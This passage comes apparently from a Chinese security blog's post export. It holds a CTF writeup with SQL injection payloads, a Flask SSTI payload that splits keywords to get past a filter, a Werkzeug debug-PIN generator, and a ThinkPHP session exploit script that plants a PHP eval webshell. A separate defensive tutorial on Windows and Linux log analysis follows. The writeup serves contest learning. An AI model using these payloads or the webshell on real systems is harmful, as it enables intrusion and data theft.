https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"msf","slug":"msf","permalink":"http://www.moonback.xyz/tags/msf/"}]},{"title":"新春战疫赛game-gyctf部分writeup","slug":"新春战疫赛game-gyctf部分writeup","date":"2020-02-21T13:33:43.000Z","updated":"2020-03-08T09:51:04.761Z","comments":true,"path":"2020/02/21/新春战疫赛game-gyctf部分writeup/","link":"","permalink":"http://www.moonback.xyz/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/","excerpt":"本篇博客主要介绍了game-gyctf的部分writeup！","text":"本篇博客主要介绍了game-gyctf的部分writeup！ web简单的招聘系统这题是是真的没想到！ 注册一个账号进去发现里面有个黑页，然后用admin万能密码成功登陆进去，看到黑页 这个黑页不是漏洞点，漏洞点就在登陆上，可以直接联合查询，回显在登陆后的页面上 order by: 1admin&#39; order by 6# 登陆失败，说明有5列 判断回显位： 1admin&#39; union select 1,2,3,4,5# 回显位为第二个 注数据库： 1admin&#39; union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata# 注表： 1admin&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()# 注字段： 1admin&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&quot;flag&quot;# 注内容： 1admin&#39; union select 1,group_concat(flaaag),3,4,5 from nzhaopin.flag# 据说三个地方都有注入，登陆，注册，黑页，我真是太菜了 easysqli_copyEzsqli盲注babyphpblacklist看到立马想到了强网杯随便注 121&#39;;show tables; #表为FlagHere1&#39;;desc FlagHere; #查看表结构，发现有flag字段 题目没有过滤handler，参见： https://dev.mysql.com/doc/refman/8.0/en/handler.html https://skysec.top/2019/12/13/2019-FudanCTF-Writeup handler类似于select语句，但又不同于后者，它只能每次查询1次记录 比如：通过handler语句查询users表的内容 123456handler users open as moonback; #指定数据表进行载入并将返回句柄别名handler moonback read first; #读取指定表&#x2F;句柄的首行数据handler moonback read next; #读取指定表&#x2F;句柄的下一行数据handler moonback read next; #读取指定表&#x2F;句柄的下一行数据...handler moonback close; #关闭句柄 所以我们就能查出flag 1231&#x27;;handler FlagHere open as moonback;handler moonback read first;# 或者直接1&#x27;;handler FlagHere open;handler FlagHere read first; Flaskapp看名字猜测是和ssti沙箱逃逸相关内容 不读取pin码随便输一个字符让base64解密报错，可以看到部分源码 12345678910@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) 简单的将一些关键字base64编码后提交发现知识简单的过滤了关键字 12345678910requestflagsystempopenimport__import__importlibevalossubprocess 因此我们可以直接改下：https://github.com/vulhub/vulhub/tree/master/flask/ssti的exp 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;ev&#x27;+&#x27;al&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__imp&#x27;+&#x27;ort__(&quot;o&quot;+&quot;s&quot;).po&#x27;+&#x27;pen(&quot;cat this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 将过滤的东西拼接到一块就能执行命令得到flag了 读取pin码先介绍一下pin码，flask项目运行时开启debug模式时会生成一个由当前环境的pin码，类似于： 1123-123-123 也就是说在某个特定环境下pin码是不变的 输入正确的pin码我们就可以进入debug页面，然后输入 1&#x2F;console 可以进入python交互式shell 关于pin码详细介绍参考：https://xz.aliyun.com/t/2553 我们需要知道6个值： username，为启动flask的用户 modname，为flask.app getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))，为Flask getattr(mod, &#39;__file__&#39;, None)，flask包目录下的app.py的绝对路径，报错可以爆出来 uuid.getnode() ，mac地址十进制 get_machine_id()，/etc/machine-id 知道这6个值我们就可以用大佬脚本跑出来pin码： 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;kingkk&#x27;,# username /etc/passwd &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),报错可以爆出来]private_bits = [ &#x27;52242498922&#x27;,# str(uuid.getnode()), /sys/class/net/ens33/address &#x27;19949f18ce36422da1402b3e3fe53008&#x27;# get_machine_id(), /etc/machine-id或者/proc/self/cgroup或/proc/sys/kernel/random/boot_i或注册表SOFTWARE\\\\Microsoft\\\\Cryptography值]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 可以用下面的payload读取文件： 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 从/etc/passwd可以看到有个flaskweb的用户，尝试着用下 读取/proc/self/cgroup，注意在docker环境中不要读/etc/machine-id 读取/sys/class/net/eth0/address获得mac地址02:42:ac:12:00:04，十进制表达式是2485377957892 从报错中看到可以看到绝对路径为/usr/local/lib/python3.7/site-packages/flask/app.py 将对应内容填入运行就能得到pin,我这里是922-522-604 easy_thinking访问www.zip，有源码，题目考察的是thinkphp6.0.0最新的session的漏洞 参考： https://www.uedbox.com/post/65126/ https://paper.seebug.org/1114/#_1 报错可以看出版本信息 先介绍一下TP框架的路由规则 12&#x2F; index.php &#x2F;Index &#x2F;Index &#x2F;index 入口文件 模块(前台) 控制器 方法 本题的利用方式： 先正常注册一个账号 登陆时抓包将sessid改成.php结尾，长度必须是32位 然后去搜索处输入东西，来到个人中心看搜索历史，这些搜索历史都保存在/runtime/session/目录内 写了个脚本： 123456789101112131415161718192021222324252627import requestsurl=&#x27;http://182.92.243.154:7893/&#x27;s=requests.session()data=&#123;&quot;username&quot;:&quot;moon&quot;,&quot;password&quot;:&quot;back&quot;&#125;headers=&#123; &quot;Cookie&quot;:&quot;PHPSESSID=1433223143322314332231433223.php&quot; &#125;def req(): s.get(url)def register(data): s.post(url+&quot;home/member/register&quot;,data=data)def login(data): s.post(url+&#x27;home/member/login&#x27;,data=data,headers=headers)def search(): data1=&#123;&quot;key&quot;:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;&#125; s.post(url+&#x27;home/member/search&#x27;,data=data1,headers=headers)def backdoor(): data2=&#123;&quot;1&quot;:&quot;echo &#x27;hacker!&#x27;;&quot;&#125; r=requests.post(url+&quot;runtime/session/sess_1433223143322314332231433223.php&quot;,data=data2) if &quot;hacker&quot; in r.text: print(&quot;[+] vulnerable!!!&quot;)req()register(data)login(data)search()backdoor() 然后蚁剑连，发现没法执行系统命令，查看phpinfo()，发现： 常规的bypass方法都不能用了，这里有个项目是关于php7 bypass disable_function的： https://github.com/mm0r1/exploits/ 这里用的就是： https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php misccode_in_morse文件是流量包，wireshark打开，导出所有http对象发现有个12.jpg，无法显示 hxd打开发现是摩斯密码，解密的base32，再解密发现就乱码了但能看出来是png文件 写了个脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from __future__ import print_functionimport base64a = open(&#x27;12.jpg&#x27;,&#x27;r&#x27;).read()s = a.split(&quot; &quot;)dict = &#123;&#x27;.-&#x27;: &#x27;A&#x27;, &#x27;-...&#x27;: &#x27;B&#x27;, &#x27;-.-.&#x27;: &#x27;C&#x27;, &#x27;-..&#x27;:&#x27;D&#x27;, &#x27;.&#x27;:&#x27;E&#x27;, &#x27;..-.&#x27;:&#x27;F&#x27;, &#x27;--.&#x27;: &#x27;G&#x27;, &#x27;....&#x27;: &#x27;H&#x27;, &#x27;..&#x27;: &#x27;I&#x27;, &#x27;.---&#x27;:&#x27;J&#x27;, &#x27;-.-&#x27;: &#x27;K&#x27;, &#x27;.-..&#x27;: &#x27;L&#x27;, &#x27;--&#x27;: &#x27;M&#x27;, &#x27;-.&#x27;: &#x27;N&#x27;, &#x27;---&#x27;: &#x27;O&#x27;, &#x27;.--.&#x27;: &#x27;P&#x27;, &#x27;--.-&#x27;: &#x27;Q&#x27;, &#x27;.-.&#x27;: &#x27;R&#x27;, &#x27;...&#x27;: &#x27;S&#x27;, &#x27;-&#x27;: &#x27;T&#x27;, &#x27;..-&#x27;: &#x27;U&#x27;, &#x27;...-&#x27;: &#x27;V&#x27;, &#x27;.--&#x27;: &#x27;W&#x27;, &#x27;-..-&#x27;: &#x27;X&#x27;, &#x27;-.--&#x27;: &#x27;Y&#x27;, &#x27;--..&#x27;: &#x27;Z&#x27;, &#x27;.----&#x27;: &#x27;1&#x27;, &#x27;..---&#x27;: &#x27;2&#x27;, &#x27;...--&#x27;: &#x27;3&#x27;, &#x27;....-&#x27;: &#x27;4&#x27;, &#x27;.....&#x27;: &#x27;5&#x27;, &#x27;-....&#x27;: &#x27;6&#x27;, &#x27;--...&#x27;: &#x27;7&#x27;, &#x27;---..&#x27;: &#x27;8&#x27;, &#x27;----.&#x27;: &#x27;9&#x27;, &#x27;-----&#x27;: &#x27;0&#x27;, &#x27;..--..&#x27;: &#x27;?&#x27;, &#x27;-..-.&#x27;: &#x27;/&#x27;, &#x27;-.--.-&#x27;: &#x27;()&#x27;, &#x27;-....-&#x27;: &#x27;-&#x27;, &#x27;.-.-.-&#x27;: &#x27;.&#x27; &#125;;tr=&#x27;&#x27;for item in s: if item in dict: tr+=dict[item]# print(tr)if len(tr)%8 != 0: tr+=&#x27;=&#x27;*(8-len(tr)%8)de=base64.b32decode(tr.encode(&#x27;utf-8&#x27;))with open(&#x27;1.png&#x27;,&#x27;wb&#x27;) as fp: fp.write(de)# print(de) 可以直接生成png图片 pdf417解密，解密地址：https://online-barcode-reader.inliteresearch.com 1https:&#x2F;&#x2F;s2.ax1x.com&#x2F;2020&#x2F;02&#x2F;06&#x2F;1yPXJ1.jpg 套娃，下载下来，查看属性发现F5，猜测F5隐写，没想到是没密码的 1java Extract 1yPXJ1.jpg 在output.txt里找到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"}]},{"title":"日志分析","slug":"日志和流量分析","date":"2020-02-18T08:57:25.000Z","updated":"2020-03-03T14:19:32.626Z","comments":true,"path":"2020/02/18/日志和流量分析/","link":"","permalink":"http://www.moonback.xyz/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"本篇博客主要介绍了日志审计的相关内容！","text":"本篇博客主要介绍了日志审计的相关内容！ 系统日志windows日志分析日志记录了系统中硬件、软件和系统问题的信息，同时还监视着系统中发生的事件。当服务器被入侵或者系统（应用）出现问题时，管理员可以根据日志迅速定位问题的关键，再快速处理问题，从而极大地提高工作效率和服务器的安全性。Windows 通过自带事件查看器管理日志，使用命令eventvwr.msc或eventvwr打开 Windows 日志位置Windows 2000/Server2003/Windows XP 1\\%SystemRoot%\\System32\\Config\\*.evt Windows Vista/7/10/Server2008/Sever2016: 1\\%SystemRoot%\\System32\\winevt\\Logs\\*.evtx %SystemRoot%为系统环境变量，默认值为C:\\WINDOWS 几个重要的事件日志文件说明（Vista/Win7/Win8/Win10/Server2008/Server 2012及之后的版本)： 事件类型 描述 文件名 系统 包含系统进程，设备磁盘活动等。事件记录了设备驱动无法正常启动或停止，硬件失败，重复IP地址，系统进程的启动，停止及暂停等行为。 System.evtx 安全 包含安全性相关的事件，如用户权限变更，登录及注销，文件及文件夹访问，打印等信息。 Security.evtx 应用程序 包含操作系统安装的应用程序软件相关的事件。事件包括了错误、警告及任何应用程序需要报告的信息，应用程序开发人员可以决定记录哪些信息。 Application.evtx Microsoft Microsoft文件夹下包含了200多个微软内置的事件日志分类，只有部分类型默认启用记录功能，如远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志。 详见日志存储目录对应文件 Microsoft Office Alerts 微软Office应用程序（包括Word/Excel/PowerPoint等）的各种警告信息，其中包含用户对文档操作过程中出现的各种行为，记录有文件名、路径等信息。 OAerts.evtx Windows PowerShell Windows自带的PowerShell应用的日志信息。 Windows PowerShell.evtx Internet Explorer IE浏览器应用程序的日志信息，默认未启用，需要通过组策略进行配置。 Internet Explorer.evtx 事件类型Windows事件日志中共有五种事件类型，所有的事件必须拥有五种事件类型中的一种，且只可以有一种。五种事件类型分为： **信息(Information)**：信息事件指应用程序、驱动程序或服务的成功操作的事件。 警告(Warning)：警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。 错误(Error)：错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。 成功审核(Success audit)：成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。 失败审核(Failure audit)：失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。 重要事件IDWindows事件日志中记录的信息中，关键的要素包含事件级别、记录时间、事件来源、事件ID、事件描述、涉及的用户、计算机、操作代码及任务类别等。其中事件的ID与操作系统的版本有关，以下列举出的事件ID的操纵系统为Vista/Win7/Win8/Win10/Server2008/Server 2012及之后的版本： 事件ID 说明 1102 清理审计日志 4624 账号成功登录 4625 账号登录失败 4768 Kerberos身份验证（TGT请求） 4769 Kerberos服务票证请求 4776 NTLM身份验证 4672 授予特殊权限 4720 创建用户 4726 删除用户 4728 将成员添加到启用安全的全局组中 4729 将成员从安全的全局组中移除 4732 将成员添加到启用安全的本地组中 4733 将成员从启用安全的本地组中移除 4756 将成员添加到启用安全的通用组中 4757 将成员从启用安全的通用组中移除 4719 系统审计策略修改 五种事件类型中，最为重要的是成功审核（Success Audit），所有系统登录成功都会被标记成为成功审核。每个成功登录的事件都会标记一个登录类型： 登录类型 描述 2 交互式登录（用户从控制台登录） 3 网络（例如：通过net use,访问共享网络） 4 批处理（为批处理程序保留） 5 服务启动（服务登录） 6 不支持 7 解锁（带密码保护的屏幕保护程序的无人值班工作站） 8 网络明文（IIS服务器登录验证） 10 远程交互（终端服务，远程桌面，远程辅助） 11 缓存域证书登录 远程连接日志（应用程序和服务日志-&gt;Microsoft-&gt;Windows-&gt;-TerminalServices-RemoteConnectionManager-&gt;Operational），重要事件 ID 和含义： 1149：用户认证成功 21：远程桌面服务：会话登录成功 24：远程桌面服务：会话已断开连接 25：远程桌面服务：会话重新连接成功 计划任务事件日志(应用程序和服务日志-&gt;Microsoft-&gt;Windows-&gt;TaskScheduler-&gt;Operational)，计划任务 ID 含义： 100：任务已开始 102：任务完成 106：已注册任务（关注点） 107：在调度程序上触发任务 110：用户触发的任务 129：创建任务流程（推出） 140：任务已更新 141：任务已删除 200：运行计划任务 325：启动请求排队 更多详细事件id说明参见微软官方：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 工具分析日志Log ParserLog Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。 Log Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659 默认会安装到C:\\Program Files (x86)\\Log Parser 2.2目录下 基本查询结构 1Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:xx.evtx&quot; 使用Log Parser分析日志 1、查询登录成功的事件 12345678登录成功的所有事件LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:Security.evtx where EventID&#x3D;4624&quot;指定登录时间范围的事件：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:Security.evtx where TimeGenerated&gt;&#39;2020-02-19 23:32:11&#39; and TimeGenerated&lt;&#39;2020-02-20 01:00:00&#39; and EventID&#x3D;4624&quot;提取登录成功的用户名和IP：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as Username,EXTRACT_TOKEN(Message,38,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4624&quot; 2、查询登录失败的事件 12345登录失败的所有事件：LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:Security.evtx where EventID&#x3D;4625&quot;提取登录失败用户名进行聚合统计：LogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,EXTRACT_TOKEN(Message,19,&#39; &#39;) as user,count(EXTRACT_TOKEN(Message,19,&#39; &#39;)) as Times,EXTRACT_TOKEN(Message,39,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4625 GROUP BY Message&quot; 3、系统历史开关机记录： 1LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message FROM c:System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006&quot; Get-WinEvent是一个从本地和远程计算机上的事件日志和事件跟踪日志文件中获取事件的工具 1234567891011121314151617181920212223# Get-WinEvent帮助命令get-help Get-WinEvent# 列出所有事件日志Get-WinEvent -ListLog *# powershell管理员权限下获取安全事件日志Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;&#125;# 过滤安全事件ID 4624Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;;ID=&#x27;4624&#x27;&#125;# 查询今天的应用和系统日志，显示前2条Get-WinEvent @&#123;logname=&#x27;application&#x27;,&#x27;system&#x27;;starttime=[datetime]::today &#125; -MaxEvents 2# 根据ID查询事件Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Where-Object &#123;$_.ID -eq &quot;4100&quot; -or $_.ID -eq &quot;4104&quot;&#125;# 查询指定时间内的事件$StartTime=Get-Date -Year 2020 -Month 2 -Day 18 -Hour 23 -Minute 30$EndTime=Get-Date -Year 2020 -Month 2 -Day 19 -Hour 0 -Minute 10Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;System&#x27;;StartTime=$StartTime;EndTime=$EndTime&#125; 详细使用可以参考：https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1 Linux日志分析Linux日志位置日志默认存放位置：/var/log/* 常见的日志文件： 路径 说明 /var/log/messages 记录 Linux 内核消息及各种应用程序的公共日志信息 /var/log/cron 记录 crond 计划任务产生的事件信息 /var/log/dmesg 记录 Linux 操作系统在引导过程中的各种事件信息 /var/log/maillog 记录进入或发出系统的电子邮件活动 /var/log/lastlog 记录每个用户最近的登录事件 /var/log/secure 记录用户认证相关的安全事件信息 /var/log/wtmp 记录每个用户登录、注销及系统启动和停机事件 /var/log/btmp 记录失败的、错误的登录尝试及验证事件 可以看到发行版本差别日志文件可能不尽相同 Ubuntu日志文件： 12345678910111213141516171819202122&#x2F;var&#x2F;log&#x2F;alternatives.log-更新替代信息都记录在这个文件中&#x2F;var&#x2F;log&#x2F;apport.log -应用程序崩溃记录&#x2F;var&#x2F;log&#x2F;apt&#x2F; -用apt-get安装卸载软件的信息&#x2F;var&#x2F;log&#x2F;auth.log -登录认证log&#x2F;var&#x2F;log&#x2F;boot.log -包含系统启动时的日志。&#x2F;var&#x2F;log&#x2F;btmp -记录所有失败启动信息&#x2F;var&#x2F;log&#x2F;Consolekit - 记录控制台信息&#x2F;var&#x2F;log&#x2F;cpus - 涉及所有打印信息的日志&#x2F;var&#x2F;log&#x2F;dist-upgrade - dist-upgrade这种更新方式的信息&#x2F;var&#x2F;log&#x2F;dmesg -包含内核缓冲信息（kernel ringbuffer）。在系统启动时，显示屏幕上的与硬件有关的信息&#x2F;var&#x2F;log&#x2F;dpkg.log - 包括安装或dpkg命令清除软件包的日志。&#x2F;var&#x2F;log&#x2F;faillog - 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。&#x2F;var&#x2F;log&#x2F;fontconfig.log -与字体配置有关的log。&#x2F;var&#x2F;log&#x2F;fsck - 文件系统日志&#x2F;var&#x2F;log&#x2F;faillog -包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。&#x2F;var&#x2F;log&#x2F;kern.log –包含内核产生的日志，有助于在定制内核时解决问题。&#x2F;var&#x2F;log&#x2F;lastlog —记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。&#x2F;var&#x2F;log&#x2F;faillog –包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。&#x2F;var&#x2F;log&#x2F;mail&#x2F; – 这个子目录包含邮件服务器的额外日志。&#x2F;var&#x2F;log&#x2F;samba&#x2F; –包含由samba存储的信息。&#x2F;var&#x2F;log&#x2F;wtmp —包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。&#x2F;var&#x2F;log&#x2F;xorg.*.log— 来自X的日志信息。 日志的优先级别 级别 英文单词 中文释义 说明 0 EMERG 紧急 会导致主机系统不可用的情况 1 ALERT 警告 必须马上采取措施解决的问题 2 CRIT 严重 比较严重的情况 3 ERR 错误 运行出现错误 4 WARNING 提醒 可能影响系统功能，需要提醒用户的重要事件 5 NOTICE 注意 不会影响正常功能，但是需要注意的事件 6 INFO 信息 一般信息 7 DEBUG 调试 程序或系统调试信息等 数字等级越小，优先级越高，消息越重要。 三种日志类型内核及系统日志： 这种日志数据由系统服务rsyslog统一管理，根据其主配置文件/etc/rsyslog.conf中的设置决定将内核消息及各种系统程序消息记录到什么位置。系统中有相当一部分程序会把自己的日志文件交由rsyslog管理，因而这些程序使用的日志记录也具有相似的格式。 用户日志： 这种日志数据用于记录Linux操作系统用户登录及退出系统的相关信息，包括用户名、登录的终端、登录时间、来源主机、正在使用的进程操作等。 程序日志： 有些应用程序会选择由自己独立管理一份日志文件（而不是交给rsyslog服务管理），用于记录本程序运行过程中的各种事件信息。由于这些程序只负责管理自己的日志文件，因此不同程序所使用的日志记录格式可能会存在较大的差异。 一些命令users users命令只是简单地输出当前登录的用户名称，每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名将显示与其相同的次数。 12ubuntu@ubuntu-virtual-machine:~$ usersubuntu who who命令用于报告当前登录到系统中的每个用户的信息。使用该命令，系统管理员可以查看当前系统存在哪些不合法用户，从而对其进行审计和处理。who的默认输出包括用户名、终端类型、登录日期及远程主机。 12ubuntu@ubuntu-virtual-machine:~$ whoubuntu tty7 2020-02-03 03:50 (:0) w w命令用于显示当前系统中的每个用户及其所运行的进程信息，比users、who命令的输出内容要丰富一些。 12345root@MoonBack:~# w 14:26:21 up 86 days, 5:32, 2 users, load average: 0.02, 0.06, 0.02USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATroot pts/0 127.0.0.1 13:43 42:53 0.54s 0.02s -bashroot pts/1 127.0.0.1 14:22 0.00s 0.02s 0.00s w last last命令用于查询成功登录到系统的用户记录，最近的登录情况将显示在最前面。通过last命令可以及时掌握Linux主机的登录情况，若发现未经授权的用户登录过，则表示当前主机可能已被入侵。 1234root@MoonBack:~# lastroot pts/1 127.0.0.1 Wed Feb 19 14:22 still logged inroot pts/1 127.0.0.1 Wed Feb 19 14:04 - 14:09 (00:04)root pts/0 127.0.0.1 Wed Feb 19 13:43 still logged in lastb lastb命令用于查询登录失败的用户记录，如登录的用户名错误、密码不正确等情况都将记录在案。登录失败的情况属于安全事件，因为这表示可能有人在尝试猜解你的密码。 1234567root@MoonBack:~# lastbuser ssh:notty 113.163.171.134 Wed Feb 19 05:39 - 05:39 (00:00)user ssh:notty 113.163.171.134 Wed Feb 19 05:39 - 05:39 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00)admin ssh:notty 14.169.178.174 Wed Feb 19 01:19 - 01:19 (00:00) awk awk是一个强大的文本分析工具 123last -n 5 | awk &#x27;&#123;print $1&#125;&#x27; #显示最近登陆的5个用户,$1实指传过来的第一个参数awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; log | head -10 #对log文件用/分割取前10行的第一列awk &#x27;&#123;print substr($1,5,5)&#125;&#x27; log | tail -10 #截取第一列后10行从第五个字符开始的五个字符 web日志IIS日志位置IIS的日志文件默认目录为C:\\inetpub\\logs\\LogFiles，可通过Internet Information Services(IIS)管理器查看，默认采用W3C格式 Log Parser Studio 需要先安装Log Parser下载地址：http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=24659 安装Log Parser Studio 下载地址：http://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765 安装完成第一个文件之后，解压第二个文件，直接运行LPS.exe即可。 新建一个查询 将[LOGFILEPATH]替换成日志的路径 就可以变成直观的表格形式了 字段前缀说明： 前缀 说明 s- 服务器操作 c- 客户端操作 cs- 客户端到服务器的操作 sc- 服务器到客户端的操作 各个字段说明： 字段 说明 date 日期，表示活动发生的日期。 time 时间，表示活动发生的时间。 s-sitename 服务名，表示客户端所访问的该站点的 Internet 服务和实例的号码。 s-computername 服务器名，表示生成日志项的服务器名称。 s-ip 服务器IP，表示生成日志项的服务器的IP地址。 cs-method 方法，例如GET或POST。 cs-uri-stem URI资源，表示请求访问的地址。 cs-uri-query URI查询，表示查询HTTP请求中问号（?）后的信息。 s-port 服务器端口，表示客户端连接的服务器端口号。 cs-username 通过验证的域或用户名，对于通过身份验证的用户，格式是域\\用户名；对于匿名用户，是一个连字符 (-)。 c-ip 客户端IP，表示访问服务器的客户端真实IP 地址。 cs-version 协议版本，例如 HTTP 1.0 或 HTTP 1.1。 user-agent 用户代理，表示在客户端使用的浏览器。 Cookie Cookie，表示发送或接受的Cookie内容，如果没有Cookie，则显示连字符（-）。 referer 引用站点，表示用户访问的前一个站点。此站点提供到当前站点到链接。 cs-host 主机，表示主机头内容。 sc-status 协议返回状态，表示HTTP或FTP的操作状态。 sc-substatus HTTP子协议的状态。 sc-win32-status win32状态，即用 Windows使用的术语表示的操作的状态。 sc-bytes 服务器发送字节。 cs-bytes 服务器接收字节。 time-taken 所用时间，即操作所花时间长短，单位为毫秒。 更多内容参见：https://www.alibabacloud.com/help/zh/doc-detail/84813.htm Apachelinux日志位置如果采用RPM包安装，默认情况下目录/usr 用来存放应用程序，目录/etc/apache2或者/etc/httpd存放软件的配置文件 如果采用源代码安装，一般默认安装在/usr/local/apache2目录下 找不到我们可以用find命令 1find / -name apache2 这里我用docker搭建的lamp发现日志文件位于/var/log/apache2目录下 access.log记录着http请求 windows日志位置安装完apache后目录结构： 日志文件位于logs目录下 nginxlinux日志位置 用docker拉取得nginx镜像日志文件位于/var/log/nginx，配置文件位于/etc/nginx，如果不知道也可以也可以find windows日志位置目录结构： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950│ nginx.exe│├─conf│ example.conf│ fastcgi.conf│ fastcgi_params│ koi-utf│ koi-win│ mime.types│ nconfig.conf│ nginx.conf│ scgi_params│ uwsgi_params│ vhosts.conf│ win-utf│├─contrib│ │ geo2nginx.pl│ │ README│ ││ ├─unicode2nginx│ │ koi-utf│ │ unicode-to-nginx.pl│ │ win-utf│ ││ └─vim│ ├─ftdetect│ │ nginx.vim│ ││ ├─indent│ │ nginx.vim│ ││ └─syntax│ nginx.vim│├─html│ 50x.html│ index.html│├─logs│ access.log│ error.log│ nginx.pid│└─temp ├─client_body_temp ├─fastcgi_temp ├─proxy_temp ├─scgi_temp └─uwsgi_temp Tomcat和上面的基本一样 参考： https://www.freebuf.com/vuls/175560.html https://xz.aliyun.com/t/2524 https://www.cnblogs.com/llife/p/11478952.html 